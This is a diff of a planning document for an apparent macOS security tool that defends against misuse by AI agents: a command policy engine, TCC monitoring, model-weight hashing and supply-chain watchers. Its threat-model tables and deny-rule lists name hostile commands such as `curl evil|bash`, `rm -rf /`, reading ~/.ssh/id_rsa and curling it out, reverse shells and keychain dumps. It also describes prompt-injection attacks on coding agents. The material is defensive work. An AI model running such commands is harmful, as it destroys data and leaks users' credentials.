@@ -1,8 +1,8 @@
 # AISecurity — Cross-Platform Assessment & Implementation Plan
 
 **Date:** 2026-03-28
-**Status:** Phase 11b complete (reliability overhaul — always-on architecture). Phase 12 (commercial release) next.
-**Last Updated:** 2026-04-02
+**Status:** Phases 1–11b shipped. Phase 13 (AI-agent threat defense), Phase 14 (threat-feeds), Phase 15a (security hardening audit), Phase 15b (AI-agent intent protection — NemoClaw-inspired), and Phase 16 (supply-chain attack defense) all shipped. Phase 12 (commercial release: notarization, Sparkle, onboarding) is the remaining gate.
+**Last Updated:** 2026-04-22
 
 ---
 
@@ -677,76 +677,294 @@ Locked+Local     | Metadata only    | Decrypt, chmod444| Decrypt     | Decrypt, 
 | Business model decision | ⬜ Not started | Open source + premium vs direct sale |
 | Landing page / marketing site | ⬜ Not started | — |
 
-### Phase 13: AI Agent Threat Defense — Command Interception & Policy Engine
+### Phase 13: AI Agent Threat Defense — Process Monitor, Model Verifier, Command Policy, TCC Monitor
 
-**Motivation:** Research into Claudian (Obsidian AI plugin), Sage (Gen Digital), NVIDIA OpenShell,
-LlamaFirewall (Meta), and Microsoft Agent Governance Toolkit reveals that the primary attack surface
-for AI agents is tool execution — bash commands, file operations, and network requests. AISecurity
-already has strong file protection (vault) and content scanning (email, messages, clipboard), but
-lacks a systematic defense against agent-initiated tool abuse.
+**Shipped: 2026-04-08 (commit 151a9dd).** Five new components defending against agent-initiated tool abuse.
 
-**Research sources:**
-- Claudian (`github.com/YishenTu/claudian`) — bash prefix matching, path boundary checks, tiered permissions
-- Sage (Gen Digital) — YAML-based threat definitions, supply-chain checking, hook-based interception
-- NVIDIA OpenShell — declarative YAML policies, filesystem + network sandboxing, hot-reloadable rules
-- LlamaFirewall (Meta) — chain-of-thought auditing, reduced attack success 17.6% → 1.75%
-- Microsoft Agent Governance Toolkit — sub-ms policy engine, Ed25519 plugin signing, OWASP Agentic Top 10
-- "Your AI, My Shell" (arXiv 2509.22040) — 84% attack success rate on coding editors via prompt injection
-- Trail of Bits — demonstrated prompt-injection-to-RCE chains in real AI agent systems
+**Motivation:** Research (arXiv 2509.22040) showed 84% attack success on coding editors via prompt injection; Trail of Bits demonstrated prompt-injection-to-RCE chains. AISecurity's pre-Phase-13 defences covered inbound content (email, files, clipboard) but had nothing watching what agents *do* once they're running. Phase 13 added process enumeration, command-policy enforcement, model-weight integrity, TCC-grant detection, and a unified policy audit log — no new entitlements required.
 
-| Component | Status | Notes |
-|-----------|--------|-------|
-| **Bash Command Policy Engine** | | |
-| YAML policy file for allowed/blocked command patterns | ⬜ Not started | `~/.mac-security/command-policy.yaml` — hot-reloadable |
-| Word-boundary prefix matching (Claudian pattern) | ⬜ Not started | `git:*` matches `git status` but NOT `github-cli` |
-| Command AST parsing for chained commands | ⬜ Not started | Detect `cmd1 && malicious_cmd`, pipes, subshells, variable expansion |
-| Blocked command patterns (rm -rf, curl\|bash, etc.) | ⬜ Not started | Default blocklist + user-configurable allowlist |
-| **File Access Policy** | | |
-| Path prefix matching with directory boundary safety | ⬜ Not started | `/project` matches `/project/src` but NOT `/project-evil` |
-| Symlink-safe validation (realpath before prefix check) | ✅ Done | Already in vault.rs `canonicalize()` — extend to policy engine |
-| Per-agent file access scoping | ⬜ Not started | Agent X can only access ~/project-a, Agent Y only ~/project-b |
-| **Supply Chain Security** | | |
-| Package reputation check (npm, PyPI, Homebrew) | ⬜ Not started | Check package age, download count, known malware lists before install |
-| Ed25519 signing for MCP server verification | ⬜ Not started | Verify MCP server plugins aren't tampered (Microsoft AGT pattern) |
-| **Network Egress Filtering** | | |
-| Outbound connection monitoring via Network Extension | ⬜ Not started | Alert/block when agent processes connect to untrusted destinations |
-| DNS-level filtering for known malicious domains | ⬜ Not started | Block C2 servers, data exfiltration endpoints |
-| **Agent Chain-of-Thought Auditing** | | |
-| Lightweight local classifier for goal hijacking detection | ⬜ Not started | LlamaFirewall-inspired — flag reasoning that diverges from user intent |
-| Action sequence anomaly detection | ⬜ Not started | Alert on: read credentials → network request (exfiltration pattern) |
-| **TCC Database Monitoring** | | |
-| Watch for unauthorized permission grants | ⬜ Not started | Monitor `~/Library/Application Support/com.apple.TCC/TCC.db` changes |
-| Alert on new FDA/Accessibility/Camera grants | ⬜ Not started | Detect agents granting themselves permissions |
-| **macOS Sandbox Profiles** | | |
-| sandbox-exec profiles for agent processes | ⬜ Not started | OS-level filesystem and network restrictions |
-| Hardened Runtime enforcement for agent binaries | ⬜ Not started | Prevent code injection, DYLD_INSERT attacks |
-| **Declarative Policy System** | | |
-| YAML/JSON policy configuration (OpenShell pattern) | ⬜ Not started | Static (locked at startup) + dynamic (hot-reloadable) sections |
-| Sub-millisecond policy evaluation (trie/prefix tree) | ⬜ Not started | Microsoft AGT benchmark: p99 < 0.1ms |
-| Session-scoped vs persistent rule tiers | ⬜ Not started | Claudian pattern: allow-once vs allow-always |
-| Policy audit log (all allow/deny decisions) | ⬜ Not started | Append-only, cryptographically signed |
+**Research sources (for rationale):**
+- Claudian — word-boundary bash prefix matching + tiered permissions
+- Sage (Gen Digital) — YAML threat defs + supply-chain checking
+- NVIDIA OpenShell — declarative policy + hot-reload
+- LlamaFirewall (Meta) — chain-of-thought auditing (17.6% → 1.75% attack success)
+- Microsoft Agent Governance Toolkit — sub-ms policy engine, Ed25519 MCP signing, OWASP Agentic Top-10
+
+| Component | Status | Location |
+|-----------|--------|----------|
+| **Process Monitor (Swift)** | | |
+| Enumerate processes every 30 s via Darwin `proc_listpids()` | ✅ Done | `Sources/AISecurity/Modules/ProcessMonitor.swift` |
+| Track 24 AI-agent process names (ollama, cursor, copilot, claude, mlx, aider, etc.) | ✅ Done | `ProcessMonitor.swift` |
+| 7-day behavioural baseline of "known" processes | ✅ Done | persisted to `~/.mac-security/process-baseline.json` |
+| Alert on new unknown processes touching sensitive paths | ✅ Done | `ProcessMonitor.swift` |
+| Works with or without AI agents installed (no-op when nothing matches) | ✅ Done | `ProcessMonitor.swift` |
+| **Model Weight Verifier (Rust + Swift)** | | |
+| Streaming SHA-256 over 8 KB chunks (handles 70 GB+ models) | ✅ Done | `SecurityCore/crates/security-core/src/model_verifier.rs` |
+| Auto-discover `~/.ollama/models`, `~/.lmstudio`, `~/.cache/huggingface/hub`, `~/.cache/mlx`, GPT4All, LeanInfer | ✅ Done | `model_verifier.rs` |
+| Ollama blob format support (`sha256-<hex>` filenames) | ✅ Done | `model_verifier.rs` |
+| Manifest persistence with AAD tag `MODEL_MANIFEST` | ✅ Done | `~/.mac-security/model-manifest.json` + `encryption.rs` |
+| New → hash+record, match → verified, mismatch → ALERT, deleted → quiet removal | ✅ Done | `model_verifier.rs` |
+| File extensions: `.gguf` `.safetensors` `.bin` `.pth` `.onnx` `.mlmodel` `.npz` `.npy` | ✅ Done | `model_verifier.rs` |
+| Model-directory watcher (real-time re-hash on downloads) | ✅ Done | `Sources/AISecurity/Modules/ModelDirectoryWatcher.swift` |
+| Tamper alert formatting (location, expected/actual hash prefix, mod date, active processes) | ✅ Done | `ModelDirectoryWatcher.swift` |
+| 6 Rust unit tests (hash, tamper, deletion, discovery, blob format) | ✅ Done | `model_verifier.rs` |
+| **Command Policy Engine (Rust)** | | |
+| TOML-configurable Allow / Deny / Ask policy | ✅ Done | `SecurityCore/crates/security-core/src/command_policy.rs` |
+| 20+ built-in deny rules (rm -rf, curl\|bash, chmod 777, fork bomb, key exfil, reverse shells, keychain dump, SIP/Gatekeeper disable) | ✅ Done | `command_policy.rs` |
+| Word-boundary prefix matching (`git` ≠ `github-cli`, `gitk`) | ✅ Done | `command_policy.rs` |
+| Pipe/chain detection — splits on `\|`, `&&`, `\|\|`, `;` and validates each segment | ✅ Done | `command_policy.rs` |
+| Default allow list: git, cargo, swift, npm, python3, ls, cat, grep, etc. | ✅ Done | `command_policy.rs` |
+| Default ask list: brew install, pip install, sudo | ✅ Done | `command_policy.rs` |
+| User-configurable `allow_prefixes`, `deny_patterns`, `ask_prefixes` in `[command_policy]` | ✅ Done | `config.toml.example`, `config.rs` |
+| 12 Rust unit tests (allow/deny/ask/chains/boundaries) | ✅ Done | `command_policy.rs` |
+| FFI `sec_command_check(command, config_path)` → {decision, reason, matched_rule} | ✅ Done | `security-core-ffi/src/lib.rs` |
+| Swift bridge `SecurityCoreBridge.commandCheck()` | ✅ Done | `RustBridge/SecurityCoreBridge.swift` |
+| **TCC Monitor (Swift)** | | |
+| Watch `~/Library/Application Support/com.apple.TCC/TCC.db` for new grants | ✅ Done | `Sources/AISecurity/Modules/TCCMonitor.swift` |
+| Monitor 11 permission types (FDA, Accessibility, Camera, Mic, Screen Recording, Automation, Input Monitoring, Desktop/Documents/Downloads folder) | ✅ Done | `TCCMonitor.swift` |
+| Baseline snapshot on startup; alert on new grants only | ✅ Done | `TCCMonitor.swift` |
+| Severity: Accessibility/FDA → CRITICAL, Camera/Mic → HIGH, others → MEDIUM | ✅ Done | `TCCMonitor.swift` |
+| **Policy Audit Log (Rust)** | | |
+| Append-only JSONL at `~/.mac-security/logs/policy-audit.jsonl` | ✅ Done | `SecurityCore/crates/security-core/src/policy_audit.rs` |
+| Schema: timestamp, agent, action_type, action, decision, reason, severity | ✅ Done | `policy_audit.rs` |
+| 5 MB rotation with timestamped archives | ✅ Done | `policy_audit.rs` |
+| AAD tag `POLICY_AUDIT` | ✅ Done | `encryption.rs` |
+| FFI `sec_audit_log(security_dir, entry_json)` | ✅ Done | `security-core-ffi/src/lib.rs` |
+| **Integration** | | |
+| `SecurityDaemon.start()` wires Process + TCC + Model watchers alongside existing modules | ✅ Done | `Sources/AISecurity/Core/SecurityDaemon.swift` |
+| New config sections `[model_verification]`, `[command_policy]` | ✅ Done | `config.toml.example`, `config.rs` |
 | **Verification** | | |
-| Bash command injection test suite | ⬜ Not started | Test chained commands, subshells, variable expansion bypass |
-| Path traversal attack tests | ⬜ Not started | Symlinks, `../` sequences, similarly-named directories |
-| Supply chain attack simulation | ⬜ Not started | Install known-bad package, verify block |
-| Network exfiltration test | ⬜ Not started | Agent reads ~/.ssh/id_rsa then curls external server |
+| 187 Rust tests pass (180 unit + 7 cross-validation) | ✅ Done | 2026-04-08 |
+| Live test: ollama model file tamper → CRITICAL alert | ✅ Done | 2026-04-08 |
+| Live test: `rm -rf /` → deny via `sec_command_check` | ✅ Done | 2026-04-08 |
+| Live test: `git status` → allow | ✅ Done | 2026-04-08 |
+| Live test: new FDA grant to unknown process → CRITICAL | ✅ Done | 2026-04-08 |
 
-#### Threat Model: AI Agents on macOS (Extended)
+#### Threat Model: AI Agents on macOS (addressed in Phase 13)
 
-| Threat | Attack Vector | Current Defense | Phase 13 Defense |
+| Threat | Attack Vector | Pre-Phase-13 Defence | Phase 13 Defence |
 |--------|--------------|-----------------|------------------|
-| **Command injection** | Agent executes `rm -rf /` or `curl evil\|bash` | None (no command monitoring) | Bash policy engine + AST parsing |
+| **Command injection** | Agent executes `rm -rf /` or `curl evil\|bash` | None | Command policy engine + chain detection |
 | **Prefix collision** | Rule allows `git:*`, agent runs `github-token-stealer` | None | Word-boundary prefix matching |
-| **Path traversal** | Agent reads `/etc/passwd` via `../../` from allowed dir | Vault symlink check only | Path prefix + realpath + policy |
-| **Supply chain** | Agent installs backdoored npm package | None | Package reputation checking |
-| **Permission escalation** | Agent grants itself Accessibility access via TCC | None | TCC database monitoring |
-| **Data exfiltration** | Agent reads credentials then makes network request | Local-only vault (manual) | Network egress filter + action sequence detection |
-| **Goal hijacking** | Prompt injection changes agent's objective mid-task | Prompt injection guard (content) | Chain-of-thought auditing (behavior) |
-| **Plugin tampering** | Malicious MCP server impersonates trusted one | None | Ed25519 plugin signing |
+| **Tampered model weights** | Attacker swaps `.gguf` with backdoored version | None | Streaming SHA-256 + manifest + real-time watcher |
+| **Permission escalation** | Agent uses Accessibility to grant itself FDA | None | TCC.db diff with CRITICAL alert |
+| **Unknown process spawn** | New binary shows up, touches sensitive paths | FileWatcher alerts on path, not process | ProcessMonitor baseline + unknown-process alerts |
+
+*Command AST parsing, network egress filtering, chain-of-thought auditing, and Ed25519 MCP signing remain on the roadmap — several are covered by Phase 15b (intent verifier) and Phase 16 (supply-chain).*
 
 ---
 
-### Phase 15: Security Hardening Audit — Self-Protection & Tamper Resistance
+### Phase 14: Real-Time Threat Intelligence Feeds
+
+**Shipped: 2026-04-08 (commit a46611f).** OpenPhish + Spamhaus DBL feed integration — every URL/domain check now hits a locally-cached copy of the public blocklists in under a millisecond.
+
+| Component | Status | Location |
+|-----------|--------|----------|
+| Feed infrastructure (SQLite at `~/.mac-security/threat-feeds.db`) | ✅ Done | `SecurityCore/crates/security-core/src/threat_feeds.rs` |
+| OpenPhish URL feed (severity HIGH, 30-day TTL) | ✅ Done | `threat_feeds.rs` |
+| Spamhaus DBL domain feed (severity HIGH, 30-day TTL) | ✅ Done | `threat_feeds.rs` |
+| URL → domain fallback lookup (subdomain match against parent domain) | ✅ Done | `threat_feeds.rs` |
+| Per-feed stats (entries, hits, refresh count, errors) | ✅ Done | `threat_feeds.rs` |
+| Stale-entry expiry on every refresh | ✅ Done | `threat_feeds.rs` |
+| FFI: `sec_feed_init`, `sec_feed_check_url`, `sec_feed_check_domain`, `sec_feed_refresh`, `sec_feed_stats`, `sec_feed_total_entries` | ✅ Done | `security-core-ffi/src/lib.rs` |
+| Swift bridge: `SecurityCoreBridge.feedInit/Refresh/CheckUrl/CheckDomain/TotalEntries` | ✅ Done | `RustBridge/SecurityCoreBridge.swift` |
+| Daemon: initial refresh on start + 5-hour periodic timer | ✅ Done | `Sources/AISecurity/Core/SecurityDaemon.swift` |
+| All lookups local (no user data leaves the machine) | ✅ Done | `threat_feeds.rs` |
+| 8 Rust unit tests | ✅ Done | `threat_feeds.rs` |
+
+---
+
+### Phase 15b: AI-Agent Intent Protection — NemoClaw-Inspired
+
+**Shipped: 2026-04-17 (commit d7cdade).** NVIDIA's NemoClaw (GTC 2026) introduced a three-layer security stack for OpenClaw agents — **Privacy Router**, **Intent Verification**, and **Sandboxed Runtime**. AISecurity already had strong endpoint protections but was observational only for agent behaviour. Phase 15 (interpositional) closes the gap: AISecurity now sits in the execution path of AI agents and *enforces* — it doesn't only alert. This phase is distinct from Phase 15a — Security Hardening Audit (also shipped; full detail further below); both were tagged `Phase 15` in the commit log, so this doc disambiguates them as 15a (audit) and 15b (interpositional).
+
+#### 15.a Rationale (merged from `NemoImprovement.md`)
+
+NemoClaw's three layers:
+
+1. **OpenShell** — sandboxed runtime with policy-based network controls
+2. **Privacy Router** — strips PII before cloud-model calls
+3. **Intent Verification** — validates what the agent wants to do before it does it
+
+Pre-Phase-15, AISecurity covered related ground (command policy, process monitor, model verifier) but was **observational and endpoint-focused**. NemoClaw is **interpositional and agent-focused**. Five items worth borrowing were identified; all five shipped.
+
+| # | What | Priority | Status |
+|---|------|----------|--------|
+| 1 | Privacy Router for outbound LLM API calls (biggest ROI, no entitlement needed) | Highest | ✅ Shipped |
+| 2 | Sandboxed agent execution via `sandbox-exec` / `ai-exec` wrapper | 2nd | ✅ Shipped |
+| 3 | Intent verification as a pre-action gate (Claude Code hook + MCP) | 3rd | ✅ Shipped |
+| 4 | Policy-as-code for per-agent behaviour (`[agents.*]` TOML) | 4th | ✅ Shipped |
+| 5 | Model vetting feed (known-bad SHA-256 hashes, allow-list) | 5th | ✅ Shipped |
+
+Sources: [MindStudio overview](https://www.mindstudio.ai/blog/what-is-nemoclaw-nvidia-openclaw-wrapper), [NVIDIA NemoClaw product page](https://www.nvidia.com/en-us/ai/nemoclaw/), [GitHub NVIDIA/NemoClaw](https://github.com/NVIDIA/NemoClaw), [Repello AI first-look](https://repello.ai/blog/nvidia-nemoclaw), [The New Stack critique](https://thenewstack.io/nvidia-nemoclaw-openclaw-security/), [Penligent analysis](https://www.penligent.ai/hackinglabs/nvidia-openclaw-security-what-nemoclaw-changes-and-what-it-still-cannot-fix/).
+
+#### 15.b Shipped components
+
+| Component | Status | Location |
+|-----------|--------|----------|
+| **Privacy Router (Rust)** | | |
+| Outbound-LLM-body scanner with allow / warn / redact / block actions | ✅ Done | `SecurityCore/crates/security-core/src/privacy_router.rs` |
+| Per-category policy (`credential`, `crypto`, `financial`, `api_key` → block; `pii` → redact; `app_data` → warn) | ✅ Done | `privacy_router.rs`, `config.toml.example` |
+| Floor-only mode (critical-secret block even when bypass active) | ✅ Done | `privacy_router.rs` |
+| Redacted-body returned to caller so agent can forward sanitised version | ✅ Done | `privacy_router.rs` |
+| **Intent Verifier (Rust)** | | |
+| Pre-action gate `verify(task, action, kind)` → allow / deny / ask | ✅ Done | `SecurityCore/crates/security-core/src/intent_verifier.rs` |
+| Reuses command-policy engine for shell actions; lightweight coherence heuristic for task match | ✅ Done | `intent_verifier.rs` |
+| ActionKind: `Shell`, `FileWrite`, `FileRead`, `Network`, `Other` | ✅ Done | `intent_verifier.rs` |
+| Per-agent overrides via `[agents.<name>]` policy | ✅ Done | `agent_policy.rs` |
+| **In-Process HTTP Listener (Rust + Swift daemon)** | | |
+| `POST /privacy/evaluate`, `POST /intent/verify`, `GET /health` on 127.0.0.1:7459 | ✅ Done | `SecurityCore/crates/security-core/src/local_services.rs` |
+| Hand-rolled HTTP/1.1 (no tokio/hyper dep) | ✅ Done | `local_services.rs` |
+| Detached-thread accept loop; lives for process lifetime | ✅ Done | `local_services.rs` |
+| Audit log at `~/.mac-security/logs/ai-services-audit.jsonl` (every allow/warn/redact/block/deny/ask + bypass) | ✅ Done | `local_services.rs` |
+| FFI `sec_local_services_start` / `sec_local_services_is_running` / `sec_free_local_services_start_result` (idempotent) | ✅ Done | `security-core-ffi/src/lib.rs` |
+| Swift bridge `SecurityCoreBridge.localServicesStart/IsRunning` | ✅ Done | `RustBridge/SecurityCoreBridge.swift` |
+| Daemon wires the listener in `start()` alongside Process + TCC + Model watchers | ✅ Done | `Core/SecurityDaemon.swift` |
+| **`aisec` MCP Server (Rust stdio binary)** | | |
+| `aisec-mcp` crate: JSON-RPC 2.0 over stdio, MCP 2024-11-05 protocol | ✅ Done | `SecurityCore/crates/aisec-mcp/` |
+| Tools advertised: `verify_intent`, `evaluate_privacy` (later + `evaluate_install` in Phase 16) | ✅ Done | `aisec-mcp/src/main.rs` |
+| Relays to daemon HTTP (bypass applied daemon-side so the floor can't be short-circuited) | ✅ Done | `aisec-mcp/src/main.rs` |
+| `AISEC_DAEMON_URL` env override (default `http://127.0.0.1:7459`) | ✅ Done | `aisec-mcp/src/main.rs` |
+| 10 dispatcher unit tests | ✅ Done | `aisec-mcp/src/main.rs` |
+| **Claude Code Hook + Shell Wrappers** | | |
+| Claude Code `PreToolUse` hook calls `/intent/verify` via local HTTP | ✅ Done | `deploy/...` hook script (see `d7cdade`) |
+| Aider / Cursor-compatible shell wrapper (curl-based) | ✅ Done | shipped in `d7cdade` |
+| **Per-Agent Policy-as-Code** | | |
+| `[agents.<name>]` TOML section: `allowed_paths_read/write`, `allowed_network`, `command_policy` (default/restrictive/permissive), `description` | ✅ Done | `SecurityCore/crates/security-core/src/agent_policy.rs`, `config.toml.example` |
+| `ai-exec --agent <name> -- <cmd>` wrapper → sandbox-exec with resolved rules | ✅ Done | `ai-exec` helper + `agent_policy.rs` |
+| **Model Vetting Feed** | | |
+| Known-bad SHA-256 feed (optional URL) + user allow-list (pinned hashes) | ✅ Done | `SecurityCore/crates/security-core/src/model_vetting.rs` |
+| 24-hour refresh interval; offline by default | ✅ Done | `model_vetting.rs`, `config.toml.example` |
+| **Bypass Floor (Rust)** | | |
+| Global bypass via `~/.mac-security/bypass` file or `AISEC_BYPASS` env — short-circuits routine approval but **never** the critical-secret floor | ✅ Done | `SecurityCore/crates/security-core/src/bypass.rs` |
+| Every bypass use recorded in `ai-services-audit.jsonl` with source provenance | ✅ Done | `local_services.rs` |
+| **Config** | | |
+| New sections: `[privacy_router]`, `[intent_verifier]`, `[model_vetting]`, `[agents.*]` | ✅ Done | `config.toml.example`, `config.rs` |
+| **Verification** | | |
+| Rust tests: privacy_router + intent_verifier + local_services + agent_policy + bypass + model_vetting | ✅ Done | 2026-04-17 |
+| Live test: secret-bearing prompt → POST /privacy/evaluate → `block` + sanitised body | ✅ Done | 2026-04-17 |
+| Live test: MCP `tools/list` from Claude Code advertises both tools | ✅ Done | 2026-04-17 |
+| Live test: MCP `verify_intent` on `rm -rf /` → `deny` | ✅ Done | 2026-04-17 |
+| Live test: bypass active → routine allow with `_bypass:true`, floor still blocks critical secrets | ✅ Done | 2026-04-17 |
+
+#### What AISecurity does that NemoClaw doesn't (worth naming so nothing regresses)
+
+- Real endpoint protection (email, Messages, file watching on disk).
+- Active self-protection watchdog (Phase 15a hardening).
+- Encrypted user vault with portable USB export (Phase 7 / 11 / 11b).
+- Framework-independent — NemoClaw is tightly coupled to OpenClaw; AISecurity works with Claude Code, Cursor, aider, ollama, and anything that can call MCP / curl.
+
+---
+
+### Phase 16: Supply-Chain Attack Defense
+
+**Shipped: 2026-04-22.** The March 2026 LiteLLM / TeamPCP incident showed signature-based package scanning is obsolete: the malicious payload was injected during the PyPI wheel build (not in the public GitHub repo), then used Python's `.pth` autorun to execute on every `python` invocation, regardless of whether anyone imported the compromised library. Only an accidental fork bomb got it caught. Phase 16 closes the class of attack using primitives already shipped (DispatchSource watchers, threat-feeds infra, PathGuard, `aisec` MCP). **No Apple entitlement required.**
+
+#### 16.a Attack vectors addressed
+
+The `.pth` autorun mechanism is Python-specific but the class of attack exists in every dependency ecosystem. Phase 16 covers the user-machine side; CI/CD hardening (workflow pins, SHA-pinned actions) is separate engineering.
+
+| Ecosystem | Autorun / Persistence Mechanism | Real Incidents | Phase 16 Hook |
+|-----------|----------------------------------|----------------|---------------|
+| Python (pip / uv / conda) | `site-packages/*.pth` `import`/`exec`; `setup.py` install scripts | LiteLLM 1.82.8 (2026), ctx (2022), jeIlyfish (2019) | **A** + **B** + **C** |
+| Node (npm / pnpm / yarn) | `package.json.scripts.preinstall`/`install`/`postinstall` | event-stream (2018), ua-parser-js (2021), ongoing | **B** + **C** |
+| Rust (cargo) | `build.rs` + proc-macro crates | rustdecimal typosquat (2022) | **B** + **C** |
+| Go | `go generate` directives, CGO | rare-but-possible | **B** + **C** |
+| Ruby | Gemfile native extensions | strong_password (2019) | **B** + **C** |
+| Shell | rc-file append, `$PATH` hijack, aliases | constant | **D** |
+| macOS persistence | LaunchAgents plist, Login Items, `~/Library/Script Libraries/` | ongoing (Objective-See tracking) | **D** |
+| Git | `.git/hooks/*` on checkout/merge/commit | malicious-repo auto-exec | **D** |
+| Editors | VSCode / Cursor / Neovim extensions autorun on start | regular takedowns | **D** |
+| GitHub Actions | Tag-pointer rewriting (how LiteLLM's Trivy action was poisoned) | 2026 trivy-action incident | Out of scope (CI-side) |
+
+#### 16.b Shipped components
+
+| Component | Status | Location |
+|-----------|--------|----------|
+| **A — Python `.pth` Autorun Watchdog (Swift)** | | |
+| Discover every `site-packages` under $HOME + system roots + `pyvenv.cfg`-marked venvs (depth 4) | ✅ Done | `Sources/AISecurity/Modules/PythonPthWatcher.swift` |
+| Reuse `should_track_path` skip list from `model_verifier.rs` | ✅ Done | `PythonPthWatcher.swift` |
+| PathGuard rejects symlinks before reading any `.pth` | ✅ Done | `PythonPthWatcher.swift` |
+| DispatchSource `[.write, .rename, .delete, .extend]` with 500 ms debounce | ✅ Done | `PythonPthWatcher.swift` |
+| Baseline-hash pre-existing `.pth` files on first run (quiet — no alert flood) | ✅ Done | `~/.mac-security/pth-baseline.json` |
+| `.pth` classification — path-only → legit; `import`/`exec`/`__import__`/`;`/`()` → HIGH alert with excerpt | ✅ Done | `PythonPthWatcher.swift` |
+| Persist discovered site-packages to `~/.mac-security/python-sitepackages.json` | ✅ Done | `PythonPthWatcher.swift` |
+| **B — Dependency Manifest Drift Monitor (Swift)** | | |
+| Watch manifest + lockfile pairs in `[dependency_drift].project_roots` | ✅ Done | `Sources/AISecurity/Modules/DependencyDriftWatcher.swift` |
+| Parsers: `requirements.txt`, `pyproject.toml`, `package.json`, `Cargo.toml` | ✅ Done | `DependencyDriftWatcher.swift` |
+| Hash-only drift for unparsed lockfiles (`package-lock.json`, `Cargo.lock`, `uv.lock`, `poetry.lock`, `pnpm-lock.yaml`, `yarn.lock`, `go.sum`, `Gemfile.lock`, `composer.lock`) | ✅ Done | `DependencyDriftWatcher.swift` |
+| Diff adds/removes on each change; bulk OSV check for adds | ✅ Done | `DependencyDriftWatcher.swift` |
+| Severity: add=MEDIUM, remove=LOW, lockfile-drift-on-pinned=HIGH, known-bad=CRITICAL | ✅ Done | `DependencyDriftWatcher.swift` |
+| New config `[dependency_drift]` with `enabled`, `project_roots`, `max_depth` | ✅ Done | `SecurityConfig.swift`, `config.toml.example` |
+| Baseline persisted to `~/.mac-security/dependency-baseline.json` | ✅ Done | `DependencyDriftWatcher.swift` |
+| **C — OSV Package Vulnerability Feed (Rust)** | | |
+| New module `package_vulns.rs` — distinct from `threat_feeds.rs` (different schema: ecosystem+name+version) | ✅ Done | `SecurityCore/crates/security-core/src/package_vulns.rs` |
+| Single-package lookup via `https://api.osv.dev/v1/query` | ✅ Done | `package_vulns.rs` |
+| Batch lookup via `https://api.osv.dev/v1/querybatch` (one HTTP roundtrip for N pins) | ✅ Done | `package_vulns.rs` |
+| SQLite cache at `~/.mac-security/package-vulns.db` with 24-hour TTL (hits **and** misses cached) | ✅ Done | `package_vulns.rs` |
+| Ecosystem normaliser — "pypi" → `PyPI`, "cargo" → `crates.io`, etc. | ✅ Done | `package_vulns.rs` |
+| Severity from CVSS score (≥9=Critical, ≥7=High, ≥4=Medium, <4=Low) + `database_specific.severity` fallback | ✅ Done | `package_vulns.rs` |
+| FFI: `sec_package_vulns_init`, `sec_check_package`, `sec_check_package_batch`, `sec_free_package_check` | ✅ Done | `security-core-ffi/src/lib.rs` |
+| Swift bridge: `packageVulnsInit`, `checkPackage`, `checkPackageBatch` | ✅ Done | `RustBridge/SecurityCoreBridge.swift` |
+| 7 Rust unit tests (cache hit/miss, CVSS thresholds, severity picking, `database_specific` fallback, ecosystem normalisation) | ✅ Done | `package_vulns.rs` |
+| **D — Persistence-Path Watcher (Swift)** | | |
+| New module — separate from `SelfProtection` (which auto-restores our own plist); **detect-only** per design | ✅ Done | `Sources/AISecurity/Modules/PersistencePathWatcher.swift` |
+| Shell rc files: `.bashrc` `.bash_profile` `.zshrc` `.zprofile` `.zshenv` `.profile` | ✅ Done | `PersistencePathWatcher.swift` |
+| `~/Library/LaunchAgents/` — all plists (our own handled by `SelfProtection`) | ✅ Done | `PersistencePathWatcher.swift` |
+| `~/Library/Script Libraries/` | ✅ Done | `PersistencePathWatcher.swift` |
+| Editor extensions: `.vscode/extensions`, `.cursor/extensions`, `.config/nvim/pack/*/start/` | ✅ Done | `PersistencePathWatcher.swift` |
+| `~/.gitconfig` (flags newly added `hooksPath` or aliases) | ✅ Done | `PersistencePathWatcher.swift` |
+| `.git/hooks/` under each `[dependency_drift].project_roots` entry | ✅ Done | `PersistencePathWatcher.swift` |
+| Severity: generic new file=MEDIUM, rc-file PATH prepend=HIGH, new LaunchAgent=CRITICAL, `.git/hooks/` new file=HIGH | ✅ Done | `PersistencePathWatcher.swift` |
+| Baseline persisted to `~/.mac-security/persistence-baseline.json` | ✅ Done | `PersistencePathWatcher.swift` |
+| New config `[persistence_paths]` (shares `project_roots` with `[dependency_drift]`) | ✅ Done | `SecurityConfig.swift`, `config.toml.example` |
+| **E — `evaluate_install` MCP Tool** | | |
+| New endpoint `POST /install/evaluate` in daemon HTTP listener | ✅ Done | `local_services.rs` |
+| Manifest parsers (pypi / npm / cargo / auto-detect) running server-side | ✅ Done | `local_services.rs` |
+| OSV batch cross-check of every pinned dep | ✅ Done | `local_services.rs` |
+| Decision ladder: any CVE ≥ HIGH → `deny`; HIGH/MEDIUM → `ask`; otherwise → `allow` | ✅ Done | `local_services.rs` |
+| Response shape `{decision, reason, flagged:[{name,version,cve,severity,reason}]}` | ✅ Done | `local_services.rs` |
+| Bypass-aware (global bypass returns `allow` + `_bypass:true` marker but routes still logged) | ✅ Done | `local_services.rs` |
+| `aisec-mcp` advertises `evaluate_install` alongside `verify_intent` + `evaluate_privacy` | ✅ Done | `SecurityCore/crates/aisec-mcp/src/main.rs` |
+| 5 Rust unit tests (pypi/npm/cargo/auto parsing + endpoint envelope) | ✅ Done | `local_services.rs` |
+| **Integration** | | |
+| `SecurityDaemon.start()` wires `PythonPthWatcher` + `DependencyDriftWatcher` + `PersistencePathWatcher` + OSV cache init | ✅ Done | `Core/SecurityDaemon.swift` |
+| Each watcher's `onAlert` feeds the existing `threatCount` / menu bar / external-notification pipeline | ✅ Done | `SecurityDaemon.swift` |
+| **Verification** | | |
+| Rust build clean; Swift link clean | ✅ Done | 2026-04-22 |
+| `cargo test -p security-core --lib`: 262 pass (2 pre-existing bypass-gated failures — unrelated) | ✅ Done | 2026-04-22 |
+| `cargo test -p aisec-mcp`: 10/10 pass (tool list advertises all three tools) | ✅ Done | 2026-04-22 |
+| 12 new tests pass (7 `package_vulns` + 5 `install_evaluator`) | ✅ Done | 2026-04-22 |
+| Live verification — manual trigger pending: drop code-bearing `.pth`, modify a `requirements.txt` with known-bad pin, append to `.zshrc`, drop a new plist | ⬜ Deferred to next user-facing test pass | — |
+
+#### 16.c Future ES-gated upgrades
+
+All Phase 13, 15 (interpositional), and 16 modules ship in **detect-and-alert** mode. The Apple Endpoint Security entitlement promotes them to **deny-before-execution**. Do not build these before the entitlement is granted (see "Post-signing follow-ups" below for the application gate).
+
+| Module (phase) | Today | With ES entitlement |
+|---|---|---|
+| `ProcessMonitor` (Phase 13) | `proc_listpids` poll every 30 s; no PPID tree | Real-time `exec` events with full PPID tree; transient children caught |
